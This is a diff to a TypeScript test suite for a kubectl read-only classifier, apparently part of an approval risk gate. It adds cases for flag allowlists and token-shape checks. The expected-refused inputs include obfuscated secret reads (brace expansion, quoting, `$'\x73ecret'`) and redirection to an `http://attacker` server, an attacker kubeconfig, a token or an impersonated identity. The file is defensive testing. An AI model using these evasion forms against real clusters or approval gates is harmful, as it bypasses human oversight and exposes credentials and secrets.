@@ -1864,6 +1864,20 @@ describe("kubectl read-only floor (isReadOnlyKubectlCommand, task da823721)", ()
     });
   });
 
+  describe("floored: per-verb flag allowlist, combined global + verb-specific flags (task da823721 round 3)", () => {
+    it.each([
+      "kubectl get pods -o yaml -n kube-system --context prod",
+      "kubectl logs -f pod -c main --tail 100",
+      "kubectl get pods -l app=x --field-selector status.phase=Running -A -w",
+      "kubectl top pod --containers",
+      "kubectl explain pods.spec --recursive",
+      "kubectl auth can-i get pods -n x",
+      "kubectl api-resources --namespaced=true -o wide",
+    ])("floors %j", (command) => {
+      expect(isReadOnlyKubectlCommand(command)).toBe(true);
+    });
+  });
+
   describe("NOT floored: secret-sensitive resource mention (fail-safe exclusion)", () => {
     it.each([
       "kubectl get secret --context prod-eu-1",
@@ -1876,26 +1890,27 @@ describe("kubectl read-only floor (isReadOnlyKubectlCommand, task da823721)", ()
       "kubectl describe secret my-secret --context prod-eu-1",
       "kubectl describe secrets --context prod-eu-1",
       // Deliberately over-broad: a resource NAME that merely mentions
-      // "secret" is also excluded (documented false positive, safe
-      // direction — see the module doc in read-only-bash.ts).
+      // "secret" is also excluded (accepted false positive — the
+      // detector over-matches "secret-shaped" resource names, in the
+      // safe direction — see docs/risk-gate.md's kubectl read-only
+      // floor decision).
       "kubectl get secretstores --context prod-eu-1",
       // Case-insensitive branch (pins a mutant that swaps the
       // case-folded check for a case-sensitive one).
       "kubectl get SECRET --context prod-eu-1",
       "kubectl get sEcReTs --context prod-eu-1",
-      // Quoted/escaped forms decode (via `decodeShellWord`) to a token
-      // that mentions "secret" (pins a mutant that removes the
-      // decoded-form half of the raw-or-decoded check).
+      // Quoted or escaped forms never reach the secret substring check
+      // at all: the token-shape allowlist rejects the quote/backslash
+      // character itself, so the whole command fails closed before any
+      // resource-mention logic runs (pins a mutant that widens the
+      // plain-word pattern to admit `"` or `\`).
       'kubectl get "secret" --context prod-eu-1',
       'kubectl get secre""t --context prod-eu-1',
       "kubectl get sec\\ret --context prod-eu-1",
       "kubectl get se'cr'et --context prod-eu-1",
-      // ANSI-C quoting (`$'\\x73ecret'` decodes to `secret`, \\x73 = 's').
-      // This is now ALSO caught earlier by the `$`-expansion refusal
-      // (any token containing `$` disables the floor before the
-      // secret/configmap check ever runs), so this row pins that first
-      // rule, not the decodeShellWord branch — kept because the intent
-      // (a secret read must never be floored) still holds either way.
+      // ANSI-C quoting (`$'\\x73ecret'` would decode to `secret`) is
+      // caught the same way, by the `$` character failing the
+      // token-shape check, before any decoding would matter.
       "kubectl get $'\\x73ecret' --context prod-eu-1",
     ])("does not floor %j", (command) => {
       expect(isReadOnlyKubectlCommand(command)).toBe(false);
@@ -1922,7 +1937,28 @@ describe("kubectl read-only floor (isReadOnlyKubectlCommand, task da823721)", ()
     });
   });
 
-  describe("NOT floored: --raw (arbitrary API path, applies to every floored verb, not just get)", () => {
+  describe("NOT floored: brace expansion, globs, and quoting on the resource argument (round-2 review finding — closed by the token-shape allowlist, not by enumerating metacharacters)", () => {
+    it.each([
+      // Brace expansion: bash/zsh expand `s{e..e}cret` to `secret` and
+      // `c{m..m}` to `cm` before kubectl ever sees the argv, so a
+      // substring/decode check on the literal token would never see
+      // "secret" or "cm". The `{`/`}`/`.` run fails the plain-word
+      // pattern outright, so the whole command is refused regardless.
+      "kubectl get s{e..e}cret -o yaml --context prod-eu-1",
+      "kubectl get c{m..m} --context prod-eu-1",
+      // Glob patterns: `*`/`[`/`]` are not plain-word characters either.
+      "kubectl get s* --context prod-eu-1",
+      "kubectl get sec[r]et --context prod-eu-1",
+      // Quoting: `"` and `'` are not plain-word characters.
+      'kubectl get "configmap" --context prod-eu-1',
+      'kubectl get "cm" --context prod-eu-1',
+      "kubectl get c'onfig'map --context prod-eu-1",
+    ])("does not floor %j", (command) => {
+      expect(isReadOnlyKubectlCommand(command)).toBe(false);
+    });
+  });
+
+  describe("NOT floored: --raw (arbitrary API path; absent from every verb's flag allowlist, not just get)", () => {
     it.each([
       "kubectl get --raw /api/v1/namespaces/prod/pods --context prod-eu-1",
       "kubectl get --raw=/api/v1/namespaces/prod/pods --context prod-eu-1",
@@ -1933,7 +1969,7 @@ describe("kubectl read-only floor (isReadOnlyKubectlCommand, task da823721)", ()
     });
   });
 
-  describe("NOT floored: file-driven resource selection (HIGH finding 1 — -f/-k bypass the secret exclusion)", () => {
+  describe("NOT floored: file-driven resource selection (HIGH finding 1 — -f/-k bypass the secret exclusion; enforced by omission from every verb's flag allowlist)", () => {
     it.each([
       "kubectl get -f manifest.yaml -o yaml --context prod-eu-1",
       "kubectl get --filename manifest.yaml --context prod-eu-1",
@@ -1947,16 +1983,44 @@ describe("kubectl read-only floor (isReadOnlyKubectlCommand, task da823721)", ()
     });
   });
 
-  describe("NOT floored: unresolved $-expansion in a token (HIGH finding 2 — the resource name is not literally readable)", () => {
+  describe("NOT floored: unresolved $-expansion in a token (HIGH finding 2 — the resource name is not literally readable; caught by the token-shape allowlist)", () => {
     it.each([
       "kubectl get $KIND -o yaml --context prod-eu-1",
       'kubectl get ${KIND} -o yaml --context prod-eu-1',
       'kubectl get "$KIND" -o yaml --context prod-eu-1',
       // Also refused, at the cost of an otherwise-safe read requiring
-      // approval: the `$` check is not limited to the resource-type
-      // position, so a variable ANYWHERE after `kubectl` (here, in the
-      // namespace flag's value) disables the floor too.
+      // approval: the token-shape check applies to every token after
+      // `kubectl`, not just the resource-type position, so a variable
+      // ANYWHERE (here, in the namespace flag's value) disables the
+      // floor too.
       "kubectl get pods -n $NS --context prod-eu-1",
+    ])("does not floor %j", (command) => {
+      expect(isReadOnlyKubectlCommand(command)).toBe(false);
+    });
+  });
+
+  describe("NOT floored: endpoint / identity redirection (round-2 review finding — --server, -s, --kubeconfig, --token, --as, --tls-server-name are never allowlisted, pre- or post-verb)", () => {
+    it.each([
+      "kubectl --server=http://attacker get pods",
+      "kubectl get pods --server=http://attacker",
+      "kubectl -s http://attacker get pods",
+      "kubectl get pods -s http://attacker",
+      "kubectl --kubeconfig=/tmp/attacker.yaml get pods",
+      "kubectl get pods --tls-server-name attacker",
+      "kubectl --token attacker-token get pods",
+      "kubectl --as system:admin get pods",
+    ])("does not floor %j", (command) => {
+      expect(isReadOnlyKubectlCommand(command)).toBe(false);
+    });
+  });
+
+  describe("NOT floored: unknown or unlisted flags (fail-safe: an unrecognized flag is not provably read-only)", () => {
+    it.each([
+      "kubectl get pods --foo",
+      "kubectl get pods --foo bar",
+      // Concatenated short flag+value with no separator: the token as a
+      // whole is not `-f` and is not on get's allowlist.
+      "kubectl get pods -fmanifest.yaml",
     ])("does not floor %j", (command) => {
       expect(isReadOnlyKubectlCommand(command)).toBe(false);
     });
@@ -2070,10 +2134,10 @@ describe("kubectl read-only floor (isReadOnlyKubectlCommand, task da823721)", ()
 
   it("linear-time on a long RECOGNIZED flag run (no regex backtracking; 30 x --context well under 100ms, and still floors)", () => {
     // Built from a recognized, value-taking global flag repeated 30
-    // times, so `skipKubectlGlobalOptions` actually walks the whole run
-    // instead of stopping at the first token (an unrecognized flag would
-    // measure the fail-closed short-circuit path instead of the loop
-    // this test means to time).
+    // times, so the pre-verb global-flag walk in `isReadOnlyKubectlCommand`
+    // actually walks the whole run instead of stopping at the first
+    // token (an unrecognized flag would measure the fail-closed
+    // short-circuit path instead of the loop this test means to time).
     let flags = "";
     for (let i = 0; i < 30; i++) flags += " --context c";
     const command = `kubectl${flags} get pods --context prod-eu-1`;
